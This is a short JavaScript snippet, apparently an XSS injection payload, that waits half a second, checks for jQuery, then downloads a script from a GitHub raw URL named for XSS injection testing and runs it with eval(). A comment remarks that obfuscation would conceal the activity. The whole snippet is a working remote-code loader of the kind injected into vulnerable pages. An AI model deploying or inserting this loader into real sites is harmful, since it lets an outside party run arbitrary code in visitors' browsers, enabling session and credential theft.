// Obfuscation would make impossible to state this is happening

setTimeout(function() {
// Check if JQery is loaded
if ("undefined" == typeof window.jQuery) {
    alert("Sorry. Not tested without JQuery so far");
  } else {
    // Execute call to download external script
    $.ajax({
      url: "https://raw.githubusercontent.com/disier/xss-injection-test/main/inject.js?" + new Date().getTime(),
      success: function (data) {
        // Execute the script without SCRIPT tag modification
        eval(data);
      },
    });
  }
}, 500)
